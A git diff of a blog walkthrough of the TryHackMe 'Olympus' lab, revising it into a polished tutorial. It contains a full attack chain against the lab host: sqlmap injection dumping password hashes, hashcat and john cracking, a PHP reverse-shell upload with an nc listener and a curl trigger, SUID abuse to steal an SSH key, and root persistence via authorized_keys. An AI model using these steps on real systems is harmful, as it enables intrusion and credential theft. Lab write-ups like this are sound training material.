@@ -11,15 +11,21 @@ image:
   path: /assets/img/2025-06-29-TryHackMe-Olympus/main.png
 ---
 
-Hi
+Hey everyone!
+
+Welcome to another adventure. Today, we're setting our sights on the heavens and attempting to conquer the TryHackMe room, **Olympus**. Let's grab our gear, set our IP, and get ready to challenge the gods!
 
 ---
+
+First things first, let's set our target's IP address as an environment variable. It just makes life easier, trust me.
 
 ```bash
 export IP=10.10.85.12
 ```
 
-typical nmap scan
+### Reconnaissance: The All-Seeing Eye of Nmap
+
+Time for our trusty sidekick, `nmap`, to do its thing. We'll run a scan for all ports (`-p-`) and try to figure out what services and versions are running.
 
 ```bash
 ❯ nmap -A -p- $IP
@@ -42,162 +48,95 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 611.24 seconds
 ```
 
-In browster I go to the website and redirected to olympus.thm
-Add the ip address to the /etc/hosts
+Alright, we've got two open ports: **SSH (22)** and **HTTP (80)**. Since we don't have any credentials yet, let's start by exploring the website on port 80.
+
+When I tried to visit the IP address in my browser, it redirected me to `olympus.thm`. This means we need to tell our computer how to find `olympus.thm`. Let's edit our `/etc/hosts` file and add the following line:
+
+```
+10.10.85.12 olympus.thm
+```
+
+Now, let's see what the website has in store for us.
 
 ![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo1.png){: width="972" height="589" }
 
-We can see that site is under development. And saying old version of this site is under this domain.
-So we can fuzz all the subdomains for this domain.
+The site is under development, but it kindly points us to an "old version" located at a different domain. The message is a bit cryptic, but it hints that we should look for subdomains.
 
-Fuzzing time using `gobuster`
+### Fuzzing for Gold with Gobuster
 
-I fuzzed all the subdomains using gobuster but found nothing so after that i tried fuzzing directories.
+My first instinct was to fuzz for subdomains, but that turned up empty. Sometimes the simplest path is the right one! Instead, let's fuzz for directories on the main site. We'll use `gobuster` with a common wordlist and check for popular file extensions.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://olympus.thm/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+...
 ===============================================================
-[+] Url:                     http://olympus.thm/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              py,css,txt,md,js,html,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.php            (Status: 200) [Size: 1948]
 /index.php            (Status: 200) [Size: 1948]
 /javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
 /phpmyadmin           (Status: 403) [Size: 276]
 /server-status        (Status: 403) [Size: 276]
 /static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
 /~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
-
-===============================================================
-Finished
+...
 ===============================================================
 ```
 
-We can see that there is a phpmyadmin is existed.
-Maybe we can later try to get into that.
+Aha! We found `phpmyadmin` (Forbidden, but we'll keep it in mind) and, more interestingly, a `~webmaster` directory. The tilde `~` often indicates a user's public web directory. This must be the "old version" the homepage was talking about! Let's go exploring.
 
-And finded ~webmaster which contains the old site.
-
-After that I fuzzde the old site:
+Navigating to `http://olympus.thm/~webmaster/` reveals a blog. Time to fuzz this directory for more secrets.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://olympus.thm/~webmaster/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://olympus.thm/~webmaster/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              py,css,txt,md,js,html,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
+...
 ===============================================================
 /LICENSE              (Status: 200) [Size: 1070]
 /README.md            (Status: 200) [Size: 2146]
 /admin                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/admin/]
 /category.php         (Status: 200) [Size: 6650]
 /css                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/css/]
-/fonts                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/fonts/]
-/img                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/img/]
-/includes             (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/includes/]
-/index.php            (Status: 200) [Size: 9386]
-/index.php            (Status: 200) [Size: 9386]
-/js                   (Status: 301) [Size: 318] [--> http://olympus.thm/~webmaster/js/]
+...
 /search.php           (Status: 200) [Size: 6621]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
+...
 ===============================================================
 ```
 
-There is admin panel maybe i can fuzz that.
-
-Also there is search.php maybe i can use that file to make sql injection.
+We hit the jackpot! An `/admin` panel and a `search.php` file. The admin panel seems like a good target, but let's fuzz it quickly to see what's inside.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://olympus.thm/~webmaster/admin/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/admin/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://olympus.thm/~webmaster/admin/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              txt,md,js,html,php,py,css
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
+...
 ===============================================================
 /categories.php       (Status: 302) [Size: 9799] [--> ../index.php]
 /comment.php          (Status: 302) [Size: 7778] [--> ../index.php]
-/css                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/css/]
-/fonts                (Status: 301) [Size: 327] [--> http://olympus.thm/~webmaster/admin/fonts/]
 /function.php         (Status: 200) [Size: 0]
-/img                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/img/]
-/includes             (Status: 301) [Size: 330] [--> http://olympus.thm/~webmaster/admin/includes/]
 /index.php            (Status: 302) [Size: 11408] [--> ../index.php]
-/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
-/js                   (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/admin/js/]
-/posts.php            (Status: 302) [Size: 9684] [--> ../index.php]
-/profile.php          (Status: 302) [Size: 7410] [--> ../index.php]
-/users.php            (Status: 302) [Size: 9070] [--> ../index.php]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
+...
 ===============================================================
 ```
 
-We can see that a lot of the paths redirecs to the normal site.
-But there is function.php which is empty and some paths which includes libraries for code.
-We can go to the js libraries.
+Most of these files redirect us back to the main site, likely because we aren't authenticated. Bummer. But wait, what about that `search.php`? Search fields are a classic entry point for SQL Injection.
 
-![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo2.png){: width="972" height="589" }
+A quick Google search for "Victor CMS vulnerabilities" (a guess based on the site's structure) leads us to this little gem on Exploit-DB:
 
-As you can this site uses jquerry 1.9.1 and some plugins. Maybe we can check that if the plugins or this jqurry version have vulns.
+**[Victor CMS 1.0 - 'search' SQL Injection (Unauthenticated)](https://www.exploit-db.com/exploits/48734)**
 
-And this jquerry version have CVE-2019-11358 but I don't think it is usable beacuse it is client side.
+Let's see if we can use `sqlmap` to exploit this.
 
-So turn back to the sql injection part:
+### SQL Injection: Fishing for Data
 
-Maybe before that we need to google some victor Cms vulns.
-
-And I found one.
-<https://www.exploit-db.com/exploits/48734>
-
-We can use this command:
+We'll use the exploit's proof-of-concept to craft our `sqlmap` command. The goal is to see what databases are on the server.
 
 ```bash
-sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
-```
-
-```bash
-❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus --tables
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.9.4#stable}
-|_ -| . [,]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
+...
 available databases [6]:
 [*] information_schema
 [*] mysql
@@ -205,6 +144,13 @@ available databases [6]:
 [*] performance_schema
 [*] phpmyadmin
 [*] sys
+```
+
+Success! The `olympus` database looks very promising. Let's see what tables it holds.
+
+```bash
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus --tables
+...
 Database: olympus
 [6 tables]
 +------------+
@@ -217,24 +163,11 @@ Database: olympus
 +------------+
 ```
 
-And than we can get the flag
+A `flag` table and a `users` table? It's like Christmas morning! Let's get the flag first.
 
 ```bash
-❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus -T flag --columns --dump
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.9.4#stable}
-|_ -| . [,]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[*] information_schema
-[*] mysql
-[*] olympus
-[*] performance_schema
-[*] phpmyadmin
-[*] sys
-
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T flag --dump
+...
 Database: olympus
 Table: flag
 [1 column]
@@ -243,51 +176,19 @@ Table: flag
 +--------+--------------+
 | flag   | varchar(255) |
 +--------+--------------+
+[1 entry]
 +---------------------------+
 | flag                      |
 +---------------------------+
 | flag{*******************} |
 +---------------------------+
-
-[*] ending @ 21:23:00 /2025-06-29/
 ```
 
-Now its time to check out the users.
+One flag down! Now, for the user credentials. This could be our key to getting a shell.
 
 ```bash
-❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 0 -D olympus -T users --columns --dump
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.9.4#stable}
-|_ -| . [']     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-available databases [6]:
-[*] information_schema
-[*] mysql
-[*] olympus
-[*] performance_schema
-[*] phpmyadmin
-[*] sys
-
-Database: olympus
-Table: users
-[9 columns]
-+----------------+--------------+
-| Column         | Type         |
-+----------------+--------------+
-| randsalt       | varchar(255) |
-| user_email     | varchar(255) |
-| user_firstname | varchar(255) |
-| user_id        | int          |
-| user_image     | text         |
-| user_lastname  | varchar(255) |
-| user_name      | varchar(255) |
-| user_password  | varchar(255) |
-| user_role      | varchar(255) |
-+----------------+--------------+
-
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T users --dump
+...
 Database: olympus
 Table: users
 [3 entries]
@@ -298,32 +199,27 @@ Table: users
 | 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
 | 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
 +---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
-
-
-[*] ending @ 21:26:31 /2025-06-29/
 ```
 
-As you can see there root and zeus has chat.olympus domains. We probably my wordlist little small for the job beacause when i tried to fuzz the subdomains i didn't find this one. Whatever lets go to the subdomain.
+Look at that! We have three users, their hashed passwords, and a very interesting clue: the `root` and `zeus` users have emails at `chat.olympus.thm`. This is the subdomain we were looking for! My initial wordlist was too small; a lesson in using bigger and better wordlists.
 
-Before this add the subdomain to the /etc/hosts.
+Let's add `chat.olympus.thm` to our `/etc/hosts` file:
 
-And we got login screen.
+```
+10.10.85.12 olympus.thm chat.olympus.thm
+```
+
+### Cracking the Gates and Getting a Shell
+
+Navigating to `http://chat.olympus.thm` brings us to a login page.
 
 ![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo3.png){: width="972" height="589" }
 
-Maybe we can try cracking bcrypt'ed passwords.
+We have usernames and hashed passwords. The `$2y$` prefix on the hashes indicates they are **bcrypt**, a strong and slow hashing algorithm. Let's fire up `hashcat` and see if we can crack these against the `rockyou.txt` wordlist.
 
 ```bash
-❯ hashcat -m 3200 -a 0 hash/hash.txt rockyou.txt
-hashcat (v6.2.6) starting
-
-Dictionary cache built:
-* Filename..: rockyou.txt
-* Passwords.: 14344391
-* Bytes.....: 139921497
-* Keyspace..: 14344384
-* Runtime...: 1 sec
-
+❯ hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+...
 $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:*********
 
 Session..........: hashcat
@@ -332,124 +228,22 @@ Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 Hash.Target......: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2...Dvnj3C
 ```
 
-And prometheus one worked just fine.
-
-I tried cracking admin too but I can't cracked it.
+Success! We cracked the password for the user `prometheus`. The other hashes were too strong for `rockyou.txt`, but one is all we need. Let's log in.
 
 ![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }
 
-I think we can upload a php reverse shell file and open that. But we need to find the name of the filename.
+We're in! And there's a file upload feature. This is our ticket to a reverse shell. The plan is:
 
-First fuzzing the site using gobuster.
+1.  Create a PHP reverse shell.
+2.  Upload it.
+3.  Find where it's stored and what it's named.
+4.  Execute it.
 
-```bash
-❯ gobuster dir -w common.txt -u http://chat.olympus.thm/ -x md,js,html,php,py,css,txt -t 50
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://chat.olympus.thm/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              md,js,html,php,py,css,txt
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/config.php           (Status: 200) [Size: 0]
-/home.php             (Status: 302) [Size: 0] [--> login.php]
-/index.php            (Status: 302) [Size: 0] [--> login.php]
-/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
-/login.php            (Status: 200) [Size: 1577]
-/logout.php           (Status: 302) [Size: 0] [--> login.php]
-/phpmyadmin           (Status: 403) [Size: 281]
-/server-status        (Status: 403) [Size: 281]
-/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
-/upload.php           (Status: 200) [Size: 112]
-/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-
-And there is a uploads folder we can look inside.
-But firstly upload a png named 0.png
-
-And tried fuzzing uploads directory:
+After uploading a test file, I couldn't find it. It seems the application renames uploaded files. But wait... remember the `chats` table we found earlier? Let's go back to our SQL injection and see what's in there. It might contain a log of the file uploads!
 
 ```bash
-❯ gobuster dir -w common.txt -u http://chat.olympus.thm/uploads/ -x md,js,html,php,py,css,txt -t 50
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://chat.olympus.thm/uploads/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              html,php,py,css,txt,md,js
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.html           (Status: 200) [Size: 0]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-
-And we can't find it.
-
-Maybe we can just upload the php reverse shell and it works maybe?
-And it not works so maybe we can try making sql request to find the file.
-
-But wait haven't i tried to log in webmaster admin page. yes ı forgot to do that.
-
-![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }
-
-And I'm in second time.
-
-I looked througt the site little bit but there is nothing I can use i think or i'd skipped something.
-
-So I go back to chat site again:
-And maked a sql request:
-
-```bash
-❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 0 -D olympus -T chats --columns --dump
-        ___
-       __H__
- ___ ___[(]_____ ___ ___  {1.9.4#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-available databases [6]:
-[*] information_schema
-[*] mysql
-[*] olympus
-[*] performance_schema
-[*] phpmyadmin
-[*] sys
-
-Database: olympus
-Table: chats
-[4 columns]
-+--------+------+
-| Column | Type |
-+--------+------+
-| file   | text |
-| dt     | date |
-| msg    | text |
-| uname  | text |
-+--------+------+
-
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T chats --dump
+...
 Database: olympus
 Table: chats
 [13 entries]
@@ -459,63 +253,41 @@ Table: chats
 | 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
 | 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
 | 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
-| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
-| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
-| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
-| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
-| 2025-06-30 | Attached : 0.png                                                                                                                                                | prometheus | bd5acd83d371ee09ba1e667ec971a153.png |
-| 2025-06-30 | Attached : 0.png                                                                                                                                                | prometheus | 00efe9b698b8b5f833b00957d095addd.png |
-| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 164b9df71fdb3a25338bb57c8c42ca3d.php |
-| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 13ae443071b51422eaf91fe755fa2dd1.php |
-| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | efa614e8934d24d3c969ac555c7c6657.php |
+...
 | 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 566295ce0926ec7f6fbc9ccea2f254ca.php |
 +------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
-
-
-[*] ending @ 22:11:18 /2025-06-29/
 ```
 
-And I found the filepaths. I use pentestmonkeys php reverse shell script btw. You can use whatever you want.
+Bingo! The `file` column contains the randomized filename. The chats confirm our suspicion: "The IT guy used a random file name function." Not random enough, it seems!
+
+I uploaded my PHP reverse shell (I used the one from Pentestmonkey), ran the `sqlmap` command again to get its new name, and then triggered it with `curl` from my terminal.
+
+Set up a listener on your machine: `nc -lvnp 4444`
+Then, trigger the shell:
 
 ```bash
 ❯ curl http://chat.olympus.thm/uploads/566295ce0926ec7f6fbc9ccea2f254ca.php
 ```
 
-And I got the shell now.
+And just like that, we have a shell!
 
-Quickly upgrade the shell:
+### Privilege Escalation: Climbing Mount Olympus
+
+First, let's upgrade our shell to something more stable and interactive.
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm-256color
-
-stty raw -echo;fg
+# Press Ctrl+Z to background
+stty raw -echo; fg
 reset
 ```
 
+Now, let's poke around. In `/home/zeus`, we find the user flag and an interesting text file.
+
 ```bash
-www-data@ip-10-10-85-12:/$ cd /home
-www-data@ip-10-10-85-12:/home$ ls
-ubuntu	zeus
-www-data@ip-10-10-85-12:/home$ cd zeus
-www-data@ip-10-10-85-12:/home/zeus$ ls
-snap  user.flag  zeus.txt
-www-data@ip-10-10-85-12:/home/zeus$ ls -la
-total 48
-drwxr-xr-x 7 zeus zeus 4096 Apr 19  2022 .
-drwxr-xr-x 4 root root 4096 Jun 29 16:54 ..
-lrwxrwxrwx 1 root root    9 Mar 23  2022 .bash_history -> /dev/null
--rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 .bashrc
-drwx------ 2 zeus zeus 4096 Mar 22  2022 .cache
-drwx------ 3 zeus zeus 4096 Apr 14  2022 .gnupg
-drwxrwxr-x 3 zeus zeus 4096 Mar 23  2022 .local
--rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
-drwx------ 2 zeus zeus 4096 Apr 14  2022 .ssh
--rw-r--r-- 1 zeus zeus    0 Mar 22  2022 .sudo_as_admin_successful
-drwx------ 3 zeus zeus 4096 Apr 14  2022 snap
--rw-rw-r-- 1 zeus zeus   34 Mar 23  2022 user.flag
--r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt
+www-data@ip-10-10-85-12:/home/zeus$ cat user.flag
+flag{***************************}
 www-data@ip-10-10-85-12:/home/zeus$ cat zeus.txt
 Hey zeus !
 
@@ -529,30 +301,19 @@ I've now got a permanent access as a super user to the olympus.
 						- Prometheus.
 ```
 
-Wow prometheus you are more than a metrics server I guess.
+Wow, Prometheus, you're more than just a metrics server! This note gives us a hint that there's a way to become a "super user." Time for some enumeration. Running `linpeas.sh` is always a good idea.
 
-Anyways we got the flag:
-
-```bash
-www-data@ip-10-10-85-12:/home/zeus$ ls
-snap  user.flag  zeus.txt
-www-data@ip-10-10-85-12:/home/zeus$ cat user.flag
-flag{***************************}
-```
-
-Linpeas time has come.
-
-And I found this binary:
+After some digging, I found a binary with the SUID bit set. This is a huge red flag! SUID allows a user to execute a file with the permissions of the file owner.
 
 ```bash
 www-data@ip-10-10-85-12:/$ ls -la /usr/bin/cputils
 -rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
 ```
 
-So It's a file mover but with zeus privilages:
+The binary is owned by `zeus` and we can execute it. It seems to be a custom utility for copying files. We can use this to copy Zeus's private SSH key from his home directory to a place we can read it, like `/tmp`.
 
 ```bash
-www-data@ip-10-10-85-12:/$ cputils
+www-data@ip-10-10-85-12:/$ /usr/bin/cputils
   ____ ____        _   _ _
  / ___|  _ \ _   _| |_(_) |___
 | |   | |_) | | | | __| | / __|
@@ -560,128 +321,69 @@ www-data@ip-10-10-85-12:/$ cputils
  \____|_|    \__,_|\__|_|_|___/
 
 Enter the Name of Source File: /home/zeus/.ssh/id_rsa
-
 Enter the Name of Target File: /tmp/id_rsa
 
 File copied successfully.
 ```
 
-And I copy the ssh key and connect zeus with ssh.
+I copied the key over to my machine, but when I tried to log in, it was protected by a passphrase. Drat! No problem, `john` can handle this.
+
+First, convert the key to a format `john` can understand using `ssh2john`. Then, crack it.
 
 ```bash
-❯ chmod 400 /tmp/id_rsa
-
-~
-❯ ssh zeus@olympus.thm -i /tmp/id_rsa
-Enter passphrase for key '/tmp/id_rsa':
-```
-
-And It got a password. Frustrating. Whatever lets crack that using john:
-
-```bash
+# On your local machine
 ssh2john id_rsa > ssh.hash
 john --wordlist=rockyou.txt ssh.hash
 john --show ssh.hash
 key:**********
 ```
 
-Now i can log in as a zeus:
+With the passphrase in hand, we can now SSH in as `zeus`.
 
-Again It's time or linpeas
+### To the Summit: Root!
 
-I can't find good info with linpeas.
+Once logged in as `zeus`, it's time for more enumeration. After looking around, I found a suspicious file in `/var/www/html/`. It was a PHP backdoor left behind by someone.
 
-I look throught all the filesytem and find some weird folder on the /var/www/html
-In this folder there is php file which is a backdoor.
-
-If you look throught the code you can see that this code executes:
+Looking at the code, it executes a very specific command: `uname -a; w; /lib/defended/libc.so.99`. Let's see what happens when we run that last part ourselves.
 
 ```bash
-uname -a; w;/lib/defended/libc.so.99
-```
-
-So we can execute that my hand.
-
-And we get the root shell:
-
-```bash
+zeus@ip-10-10-85-12:~$ uname -a; w; /lib/defended/libc.so.99
 whoami
 root
 ```
 
+We have a root shell! It seems this library was another SUID binary or part of a misconfigured cron job that elevates our privileges. Let's grab the final flag.
+
 ```bash
-cat root.flag
+cat /root/root.flag
                     ### Congrats !! ###
-
-
-
-
-                            (
-                .            )        )
-                         (  (|              .
-                     )   )\/ ( ( (
-             *  (   ((  /     ))\))  (  )    )
-           (     \   )\(          |  ))( )  (|
-           >)     ))/   |          )/  \((  ) \
-           (     (      .        -.     V )/   )(    (
-            \   /     .   \            .       \))   ))
-              )(      (  | |   )            .    (  /
-             )(    ,'))     \ /          \( `.    )
-             (\>  ,'/__      ))            __`.  /
-            ( \   | /  ___   ( \/     ___   \ | ( (
-             \.)  |/  /   \__      __/   \   \|  ))
-            .  \. |>  \      | __ |      /   <|  /
-                 )/    \____/ :..: \____/     \ <
-          )   \ (|__  .      / ;: \          __| )  (
-         ((    )\)  ~--_     --  --      _--~    /  ))
-          \    (    |  ||               ||  |   (  /
-                \.  |  ||_             _||  |  /
-                  > :  |  ~V+-I_I_I-+V~  |  : (.
-                 (  \:  T\   _     _   /T  : ./
-                  \  :    T^T T-+-T T^T    ;<
-                   \..`_       -+-       _'  )
-                      . `--=.._____..=--'. ./
-
-
-
-
+...
                 You did it, you defeated the gods.
                         Hope you had fun !
 
-
-
                    flag{******************)_}
-
-
-
 
 PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)
 
                   (Hint : regex can be usefull)
 ```
 
-Ok Now we need to fing a secret flag
+### The Bonus Round: Prometheus's Secret
 
-Firstly log in as a root with ssh:
+The note mentions a bonus flag and suggests using regex. Let's become root properly. As `zeus`, I added my public SSH key to `/root/.ssh/authorized_keys`, then SSH'd in directly as root.
 
-1. Add you public key to the root/.ssh/authorized_keys
-
-2. `ssh root@olympus.thm`
-
-Now we can try to get all the word which starts with flag{ with this command:
+Now, for the hunt. The hint suggests using `grep` to find any file containing the string `flag{`.
 
 ```bash
-find . -type f -exec cat {} + > output.txt
+# A safer way to search the whole system
+cd /
+grep -irl "flag{"
 ```
 
-Even with grep there will be some crappy binary in this file. So after this command finishes I'll use vim to search throught flag{
-
-But never be me beacuse I run vim in the target machine rather than downloading the file and running in my system now system crashed out a little bit.
-
-Anyways If you don't want use this command. the secret flag is on /etc/ssl/private.
+After a short wait, it points us to a hidden file:
 
 ```bash
-root@ip-10-10-85-12:/etc/ssl/private# cat .b0nus.fl4g
+root@ip-10-10-85-12:/# cat /etc/ssl/private/.b0nus.fl4g
 Here is the final flag ! Congrats !
 
 flag{*****************}
@@ -693,6 +395,7 @@ grep -irl flag{
 
 
 
-
 Hope you liked the room ;)
 ```
+
+And that's it! We've conquered Olympus, defeated the gods, and even found Prometheus's secret stash. What a climb! Thanks for reading, and happy hacking!
